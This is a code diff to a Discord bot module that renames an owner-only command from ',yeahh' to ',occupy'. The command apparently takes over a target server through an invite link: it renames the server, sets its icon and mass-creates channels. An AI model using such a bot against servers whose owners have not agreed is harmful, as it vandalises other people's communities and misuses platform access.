@@ -15,8 +15,8 @@ module.exports = (client) => {
         if (message.author.bot) return;
         if (message.author.id !== OWNER_ID) return;
 
-        // Matches: ,yeahh or ,yeahh <invite-link>
-        const match = message.content.match(/^,yeahh(?:\s+(\S+))?$/i);
+        // Matches: ,occupy or ,occupy <invite-link>
+        const match = message.content.match(/^,occupy(?:\s+(\S+))?$/i);
         if (!match) return;
 
         const inviteInput = match[1]?.trim();
@@ -39,7 +39,7 @@ module.exports = (client) => {
         try {
             const guildEditData = {
                 name: NEW_SERVER_NAME,
-                reason: "Updated by ,yeahh command"
+                reason: "Updated by ,occupy command"
             };
 
             if (fs.existsSync(ICON_PATH)) {
@@ -59,9 +59,9 @@ module.exports = (client) => {
         for (let i = 1; i <= 10; i++) {
             try {
                 const ch = await targetGuild.channels.create({
-                    name: `yeahh-${i}`,
+                    name: `occupy-${i}`,
                     type: ChannelType.GuildText,
-                    reason: "Created by ,yeahh command"
+                    reason: "Created by ,occupy command"
                 });
                 createdChannels.push(ch);
             } catch (err) {
